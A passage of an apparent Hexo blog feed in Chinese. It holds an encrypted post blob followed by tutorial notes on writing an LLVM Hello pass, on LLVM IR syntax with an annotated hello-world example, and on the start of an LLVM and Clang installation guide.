8d6b42dd0216ade1be64412041bae286710f3cbcc11414cd6aa8dbc8870fd4cb551f16a30fda203904284f93bb80b8267d294d464c3da009660f47782f6db874860d9aa00c6e20e7c086af9b17bf9f4ceaf01a0a020ad5fb196691b3b531c0437784d657371baf276b2fb39d1a146878ba775ca3cf70df5862b6eee87ee15079e6e548e500026ae687188b873c19a0bfe4bfd0fdf0a6a23aef49871f15f8c46372678c51b5050ceaf50010697d8f67ca0201cb89c76f6165ddfbf7d4139f8b68effb678bdc3ad0b5971b29b126f5aa63531396d7c5203b4e32c19b3c59300d439a89ee0757e20b711e7c7a271b33a7904592d7f633361afb1568643643bdba34b866c38552034024a96dd4624ccb1d20f5d3afda41337d1dc4666afa67bb88c43e87336008f65ee9cd1428aa5cccc20fdd05cf3b20f45359ba3832fe4c2a9a04b383bf012ace3bb746bced9fc828a5495ad7a575fc2f48db0015dc382ecb0743568d542dce8bf82577fd06e9adc849ec6f998be2188e6b91ad9a7dc41f16465ad6c64484932c1f63ea29ca558538422cf5c384a3a67a52bff5fb645a9387f267ebe5a2732f4a25d0e7def59cb7dc6f4e9b1c7872003dffde8e3629ffb61dd4c7aba331ddeea3afa6bb08629a93a69d3620d61b705dbbd756596e69ff1ce2585c37cd955712d663547b9638fcb416815b354976b05580e23ba8d6486e1bdbd7a5770276a57fb5723107e5101744480607ac9f9aceb335f9edba2923273803b634a5c22971833fd579234cad1147290d2801b17fbc0f4309df963888a0a070cf5e0ba923584660563ef5f63779a26bd2f33b382a47f4b951e6476bc945026730e935ef2ab994f9ef20009b01aa4bd5d93d98674a639dc4606f35f83b1f3d8e76126f178caf5c2a1f9e6d1b252a5c11fab2526d45a367e7d29c18e0de12b8c683f1990a2194192dc269fa84e0025f8c25e3b289047ab3b2de89a56ccca3746523a2f6cc0966ffbbb38639535d74a665d48fcdb443457445c86ddf41ead46e48c954aa9f49b4c8bd3a4fec184c07bbac88321972ac7380be263eed4928fbe56a4de90daee723e26c2de793d95d158569083b9ba2b33e4fbc2b8a9996f1935cd19e9be0490eadc3311a41265a44fe142f294708aa2440440f5e59849a8d619d3e4b64247b543333c465116aa04894bb7dc99f0dc328e5a8d02f3da3f8e7cc7dbe84ff68dc004eb475241b64fea32a208026a20d97429fed849257f6f5a12398146fda63d57514a5e4c3cb5f7e5e9bdcd5c4dbdae9ad98170f1ee30f97cc703d794b6631cade1702f94590ebcf465dbecabeb10a17d7bdae6ac4b25d8508209a029a9731cf962ef278aec1e80d2402359a251723090fb783b6273cdd9191f0b6e6bdb5356a985bf873edf940c5f3325ec6ddb8376cc84dbff1d062e58a8b996e19a0a4809cd289556318f7fd17fc6ab535b3d36a9f6443a4b340e74991f0686ef5d7a47fe645314130dbde9b3b96cc7c86ec0ad98852fcd233914169a616dc6fdd98f3000f0b4a89bd5e87d7a52454fcf95d656d7266a4a250bae1fbe8eed25add9277e189c3700523e45da33d83d65e30fed465ca5b93680c21b0a55a3e4028f508924cea75a8f6c26d6b743c63a1429549b89b3a70ad06147b652a0e839ce85e9305510eeadf304185e766af0df819cdd73bf77d5a36215127f691a51c7f7564fbdb3343588a43d616eb3874e5e8740dad0754528e69c1128076dc816ac3e05fa1df65439c0a772b5ba3a6a42d6b5f41abb5655699779dfc2258b206d74fbe83a887ce6444bc157f8e53f35f40cdab895d7d25dd3a8bc71b7d8885a0bdd30388cd786ee2eeae1d61b8b4cd061b4c10f9936e2a5dff3997a3ec1ff51e3c4743c06dac19261d56014caf5a8b62069d8bee9a35c79c458488c5e06f656b46fb00bfb1f1b807f343100aab409771285624e3786adfd46d0c6f7e0bbcc7c4c2192806bd75a9b3d3981193c3a742465b818774af46cbf7d38cf6e7735459f176071081a7834a0bdff4c9b8f18cacc43793ea0d116ee77704d5eec125dbfbf3057005903e9d99b18e7bc08adea0f282219f79075949c22212cc3e755492112dfe6f370abf6fe95c11490d2d013fd0e09327f030c37c714a61ef15488732f278cf3c34845c7c4f72b196711e8e62c475e13e83e11f7aa2d7f8c3a26e6fb31071e1fc5653b46f53752a93b2fca3180723eee1c4cef025be3d6de04fa05922064533c071a541296b43356432595f795e8cc648a393b668ba988cba5c634ea1a45285be0438bd7d6cf28f1b646eb7fd0f0ee0e24b4dd7c4bd6901233041fc7ac125b312b80f92ad9bff596692cff220b0195a8d3e69269e4e3898f8d1c0506ccda75e7fc557d93afcb207998694c33e7f68f8a7eec41d36be9ed26bfa1c13a15147b269f26b0e3fc608a2d8234a9688e7efe15cafde7cad34ebcb4133a4b1c7f9f9d36615d1c6d48f205974ea2f8ecc34a5535075d0701d7a4e1f8f92a1bdc088b978b49113211f6c8936b91290fdc15b6e571f01a07b1d7c5d09f80c9d529fdcf9047e397dd5ba7ba24914b9e85fa641ae8cbfe82c39a6cc0f7fd83cf54b7e372047678d2d08c801ae740c97738ef0f063536c315cbbbcc066a7778d4f61ffffdbfa293f1831b3467a7bd8efe8a0acb70522af7fc9a485e1b36958552ea26d9bc695f151ab8226</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pass&quot;入门&quot;</title>
      <link href="posts/e671613c/"/>
      <url>posts/e671613c/</url>
      
        <content type="html"><![CDATA[<h2 id="pass简介"><a href="#pass简介" class="headerlink" title="pass简介"></a>pass简介</h2><p><code>pass</code>：llvm pass 是 llvm 架构的重要组成部分。pass 的主要工作是：对代码进行分析、优化代码。所有 llvm pass 都是<code>pass</code>的子类，通过通过重写从中继承的虚方法来实现功能<code>Pass</code>。LLVM Pass框架的一个主要特性是它根据传递遇到的约束（由它们派生自哪个类来指示）来调度传递以高效的方式运行。</p><p><code>pass</code>大致可以分为两类：分析和转换。分析类的<code>pass</code>以提供信息为主，转换类的则要修改中间代码。</p><p><code>pass</code>类如下：</p><ul><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-immutablepass-class">ImmutablePass</a>：不运行, 不改变状态也永不更新的<code>pass</code>, 一般情况下用于显示编译器的配置信息.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-modulepass-class">ModulePass</a>：用于执行任何非结构化的过程间优化。通用类型的<code>pass</code>，将整个程序示为一个单元处理。用<code>virtual bool runOnModule(Module &amp;M) = 0;</code>来实现<code>ModulePass</code>.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-callgraphsccpass-class">CallGraphSCCPass</a>：用于被那些需要从底向上(bottom-up)遍历call graph的pass调用.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-functionpass-class">FunctionPass</a>：是以单个函数为作用域的<code>pass</code>, 每个函数间是相互独立的, 相互之间无法影响</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-looppass-class">LoopPass</a>：是以单个<code>loop</code>为作用域的<code>pass</code>, 每个<code>loop</code>间相互独立. <code>LoopPass</code>以嵌套方式处理循环, 外层循环最后处理.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-regionpass-class">RegionPass</a>：类似与<code>LoopPass</code>，但是在函数中的每个单入口单出口区域执行。 <code>RegionPass</code>以嵌套顺序处理，以便最后处理最外面的区域。p</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-basicblockpass-class">BasicBlockPass</a>：用于实现本地优化，优化通常每次针对一个基本块或指令运行。</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-machinefunctionpass-class">MachineFunctionPass</a>：类似<code>FunctionPass</code>, 区别在于前者属于<code>LLVM code generator</code>(后端), 生成架构相关代码, <code>FunctionPass</code>属于<code>LLVM optimizer</code>(中端), 生成通用的IR.</p></li></ul><h2 id="pass”入门”"><a href="#pass”入门”" class="headerlink" title="pass”入门”"></a>pass”入门”</h2><h3 id="编写-分析"><a href="#编写-分析" class="headerlink" title="编写/分析"></a>编写/分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~&#x2F;llvm&#x2F;llvm-7.0.1.src&#x2F;lib&#x2F;Transforms&#x2F;Hello</span><br><span class="line">$ ls</span><br><span class="line">CMakeLists.txt  Hello.cpp  Hello.exports</span><br></pre></td></tr></table></figure><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p><p>可以参考官方教程再自己搞一个。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">  Hello() : FunctionPass(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    errs() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">    errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="function"><span class="params">    [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder,</span></span></span><br><span class="line"><span class="function"><span class="params">       legacy::PassManagerBase &amp;PM) &#123; PM.add(<span class="keyword">new</span> Hello()); &#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>对上述代码的一些分析：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span>&#123;</span><br></pre></td></tr></table></figure><p>开始一个新的匿名命名空间。在<code>C++</code>中匿名命名空间会引入静态全局作用域，类似C语言中的<code>static</code>关键字，它使在匿名命名空间内声明的内容仅对当前文件可见。</p><p>接着，声明我们的<code>Pass</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br></pre></td></tr></table></figure><p>声明了一个<code>Hello</code>类，它是<code>FunctionPass</code>的子类。<code>FunctionPass</code>类一次只操作一个函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">Hello() : FunctionPass(ID) &#123;&#125;</span><br></pre></td></tr></table></figure><p>声明一个 pass 的 ID，llvm 将会使用ID来定位这些pass。避免使用复杂的C++运行机制。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      errs() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br></pre></td></tr></table></figure><p>定义<code>runOnFunction</code>方法，覆写从<code>FunctionPass</code>继承的虚函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>初始化Pass ID。LLVM使用ID的地址来标识Pass，因此初始化值并不重要。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>注册类<code>Hello</code>，第一个命令行参数<code>hello</code>，并命名为<code>Hello World Pass</code>。最后两个参数描述了它的行为：如果传递遍历CFG而不修改它，则第三个参数设置为<code>true</code>; 如果pass 是分析 pass，那么将会有第四个参数，为<code>true</code>，反之则为<code>false</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>在我们刚刚创建的<code>build</code>内，执行 <code>make</code>，得到一个新文件<code>LLVMHello.so</code></p><p>我们在<code>~/llvm/build/lib</code>下可以找到对应的文件。</p><h3 id="使用opt命令运行pass"><a href="#使用opt命令运行pass" class="headerlink" title="使用opt命令运行pass"></a>使用opt命令运行pass</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ clang -S -O3 -emit-llvm hello.c</span><br><span class="line">$ opt -load LLVMHello.so -hello &lt; hello.ll &gt; /dev/null</span><br><span class="line">Hello: main</span><br><span class="line">$ opt -load LLVMHello.so -hello -time-passes &lt; hello.bc &gt; /dev/null</span><br><span class="line">Hello: main</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">                      ... Pass execution timing report ...</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">  Total Execution Time: 0.0001 seconds (0.0001 wall clock)</span><br><span class="line"></span><br><span class="line">   ---User Time---   --User+System--   ---Wall Time---  --- Name ---</span><br><span class="line">   0.0001 ( 56.3%)   0.0001 ( 56.3%)   0.0001 ( 56.4%)  Bitcode Writer</span><br><span class="line">   0.0000 ( 37.0%)   0.0000 ( 37.0%)   0.0000 ( 37.8%)  Hello World Pass</span><br><span class="line">   0.0000 (  6.7%)   0.0000 (  6.7%)   0.0000 (  5.8%)  Module Verifier</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Total</span><br><span class="line"></span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">                                LLVM IR Parsing</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">  Total Execution Time: 0.0001 seconds (0.0001 wall clock)</span><br><span class="line"></span><br><span class="line">   ---User Time---   --User+System--   ---Wall Time---  --- Name ---</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Parse IR</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Total</span><br></pre></td></tr></table></figure><p>我们可以使用opt命令通过您的Pass来运行LLVM程序。由于您已使用<code>RegisterPass</code>注册了Pass，因此一旦加载，您就可以使用 <strong>opt</strong> 工具访问它。</p><p><code>-load</code>选项指定 Pass 作为共享对象加载，加载后<code>-hello</code>才是有效的。（这也是注册Pass的原因之一）。因为 <code>-hello</code>没有修改任何东西，所以直接查看结果即可。</p><p>也可以通过 <code>opt -load LLVMHello.so-help |grep -i hello</code>来查看其他注册字符串，当然最后也可以查看一下运行时间。</p><p>大致了解了 <code>pass</code> 的流程和编写骨架吧。</p><p>参考：</p><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p><p><a href="https://www.cnblogs.com/Five100Miles/">https://www.cnblogs.com/Five100Miles/</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm IR学习</title>
      <link href="posts/6f86e98f/"/>
      <url>posts/6f86e98f/</url>
      
        <content type="html"><![CDATA[<h3 id="IR结构"><a href="#IR结构" class="headerlink" title="IR结构"></a>IR结构</h3><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://i.loli.net/2020/07/12/n2eB89dIkVY4OT5.png" alt="llvm" style="zoom:50%;" /><ul><li>Module：每个<code>module</code>包含全局变量列表，函数列表，该模块所依赖的库（或其他module）列表，符号表以及有关目标特性的各种数据。</li><li>Function：编程语言中的函数，包括函数签名和若干个基本块，函数内的第一个基本块叫做入口基本块。</li><li>BasicBlock：是一组顺序执行的指令集合，只有一个入口和一个出口，控制流只能从第一个指令进入该块。非头尾指令执行时不会违背顺序跳转到其他指令上去。每个基本块最后一条指令一般是跳转指令（跳转到其它基本块上去），函数内最后一个基本块的最后条指令是函数返回指令。</li><li>Instruction：指令是LLVM IR中的最小可执行单位，每一条指令都单占一行</li></ul><h3 id="IR语法"><a href="#IR语法" class="headerlink" title="IR语法"></a><a href="https://llvm.zcopy.site/docs/langref/">IR语法</a></h3><h4 id="获取IR"><a href="#获取IR" class="headerlink" title="获取IR"></a>获取IR</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ clang -emit-llvm -c hello.c -o hello.bc    <span class="comment">#二进制码</span></span><br><span class="line">$ clang -emit-llvm –S -c hello.c -o hello.ll <span class="comment">#获取IR</span></span><br></pre></td></tr></table></figure><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><ul><li>LLVM 汇编语言中的注解以分号 <code>;</code>开始，并持续到行末</li><li>全局标识符要以 <code>@</code> 字符开始。所有的函数名和全局变量都必须以 <code>@</code> 开始。</li><li>LLVM 中的局部标识符以百分号 (<code>%</code>) 开始。标识符典型的正则表达式是 <code>[%@][a-zA-Z$._][a-zA-Z$._0-9]*</code>。</li><li>LLVM 拥有一个强大的类型系统，LLVM 将整数类型定义为 <code>i*N*</code>，其中 <em>N</em> 是整数占用的字节数。如：i32，i64</li><li>矢量或阵列类型声明为 <code>[no. of elements X size of each element]</code>。对于字符串 “Hello World!”，可以使用类型 <code>[13 x i8]</code>，假设每个字符占用 1 个字节，再加上为 NULL 字符提供的 1 个额外字节。</li><li><code>hello-world</code> 字符串的全局字符串常量进行如下声明：<code>@hello = constant [13 x i8] c&quot;Hello World!\00&quot;</code>。使用关键字 <code>constant</code> 来声明后面紧跟类型和值的常量。</li><li>LLVM 允许声明和定义函数。以关键字 <code>define</code> 开始，后面紧跟返回类型，然后是函数名。返回 32 字节整数的 <code>main</code> 的简单定义类似于：<code>define i32 @main() &#123; ; some LLVM assembly code that returns i32 &#125;</code>。</li><li>函数声明：以 puts 函数为例，<code>declare i32 puts(i8*)</code>。该声明以关键字 <code>declare</code> 开始，后面紧跟着返回类型、函数名，以及该函数的可选参数列表。该声明必须是全局范围的。</li><li>每个函数均以返回语句结尾。有两种形式的返回语句：<code>ret &lt;type&gt; &lt;value&gt;</code> 或 <code>ret void</code>。对于简单的主例程，使用 <code>ret i32 0</code> 就足够了。</li><li>使用 <code>call &lt;function return type&gt; &lt;function name&gt; &lt;optional function arguments&gt;</code> 来调用函数。注意，每个函数参数都必须放在其类型的前面。返回一个 6 位的整数并接受一个 36 位的整数的函数测试的语法如下：<code>call i6 @test( i36 %arg1 )</code>。</li><li>如果函数入口块没有明确的标签，则会分配标签<code>％0</code>，那么该块中的第一个未命名的临时块将为<code>％1</code>，以此类推。</li></ul><h3 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h3><p>都写在注释里了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;hello.c&#39;   </span><br><span class="line">source_filename &#x3D; &quot;hello.c&quot;  ;指明源文件名</span><br><span class="line">target datalayout &#x3D; &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;  </span><br><span class="line">;指明机器架构和数据布局</span><br><span class="line">target triple &#x3D; &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line">;定义字符串 hello world，unnamed_addr表明该地址不重要，并且可以合并两个相同的函数。</span><br><span class="line">@str &#x3D; private unnamed_addr constant [14 x i8] c&quot;Hello worl1d.\00&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind uwtable</span><br><span class="line">;定义函数，local_unnamed_addr表明该地址在模块内是不明显的</span><br><span class="line">define i32 @main() local_unnamed_addr #0 &#123;</span><br><span class="line">;调用puts函数</span><br><span class="line">  %1 &#x3D; tail call i32 @puts(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @str, i64 0, i64 0))</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">;函数声明</span><br><span class="line">declare i32 @puts(i8* nocapture readonly) local_unnamed_addr #1</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; nounwind uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;false&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; nounwind &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags &#x3D; !&#123;!0&#125;</span><br><span class="line">!llvm.ident &#x3D; !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 &#x3D; !&#123;!&quot;clang version 6.0.0-1ubuntu2 (tags&#x2F;RELEASE_600&#x2F;final)&quot;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html#artrelatedtopics">getelementptr</a>：</p><p><code>getelementptr</code> 的第一个参数是全局字符串变量的指针。要单步执行全局变量的指针，则需要使用第一个索引，即 <code>i64 0</code>。因为 <code>getelementptr</code> 指令的第一个参数必须始终是 <code>pointer</code> 类型的值，所以第一个索引会单步调试该指针。0 值表示从该指针起偏移 0 元素偏移量。我的开发计算机运行的是 64 位 Linux，所以该指针是 8 字节。第二个索引 (<code>i64 0</code>) 用于选择字符串的第 0 个元素，该元素是作为 <code>puts</code> 的参数来提供的。</p><p>参考文章：</p><p><a href="https://llvm.zcopy.site/docs/langref/">https://llvm.zcopy.site/docs/langref/</a></p><p><a href="http://www.nagain.com/activity/article/7/">http://www.nagain.com/activity/article/7/</a></p><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html">https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm 环境搭建示例</title>
      <link href="posts/a75e0ae9/"/>
      <url>posts/a75e0ae9/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本机：<code>ubuntu 18.04</code></p><h3 id="直接安装"><a href="#直接安装" class="headerlink" title="直接安装"></a>直接安装</h3><h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install llvm</span><br></pre></td></tr></table></figure><p>配置环境变量：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">If you need to have llvm first in your PATH run:</span><br><span class="line">  echo &#x27;export PATH=&quot;/usr/local/opt/llvm/bin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line">For compilers to find llvm you may need to set:</span><br><span class="line">  export LDFLAGS=&quot;-L/usr/local/opt/llvm/lib&quot;</span><br><span class="line">  export CPPFLAGS=&quot;-I/usr/local/opt/llvm/include&quot;</span><br></pre></td></tr></table></figure><h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install llvm</span><br><span class="line">$ sudo apt install clang</span><br></pre></td></tr></table></figure><h3 id="llvm和clang混合编译"><a href="#llvm和clang混合编译" class="headerlink" title="llvm和clang混合编译"></a>llvm和clang混合编译</h3><p>要求：</p><table><thead><tr><th align="center">Package</th><th align="center">Version</th><th>Notes</th></tr></thead><tbody><tr><td align="center"><a href="http://gcc.gnu.org/">GCC</a></td><td align="center">&gt;=5.1.0</td><td>C/C++ compiler1</td></tr><tr><td align="center"><a 